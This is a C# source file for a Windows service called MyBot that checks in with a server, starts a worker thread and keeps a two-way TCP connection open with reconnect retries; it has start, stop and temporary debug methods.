using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Xml;
using System.Threading;
using System.Threading.Tasks;
using MyBot.ThreadObjects;

namespace MyBot
{
    public partial class MyBot : ServiceBase
    {
        public static int id { get; private set; }
        private object status;
        private OperationWorker worker;
        private MyTcpClient tcpClient;

        public MyBot()
        {
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {
            var details = Actions.CheckIn();
            MyBot.id = details.id;
            this.status = (object)details.status;

            tcpClient = new MyTcpClient();
            worker = new OperationWorker(details.url, details.status);
            Thread workerThread = new Thread(worker.DoWork);
            Thread tcpOutThread = new Thread(tcpClient.StreamOut);
            Thread tcpInThread = new Thread(tcpClient.StreamIn);

            workerThread.Start();

            while(!tcpClient.IsConnected())
            {
                tcpClient.RequestStop();
                tcpClient.Connect(details.serverIp, details.serverPort);
                System.Threading.Thread.Sleep(2000);
            }
            tcpClient.SetWorkerObject(worker);
            tcpOutThread.Start();
            tcpInThread.Start();
        }
        protected override void OnStop()
        {
            worker.RequestStop();
            tcpClient.RequestStop();
            Actions.CheckOut(id);
        }

        //temporary method
        public void OnDebug()
        {
            OnStart(null);
            System.Threading.Thread.Sleep(60000);
            OnStop();
        }
    }
}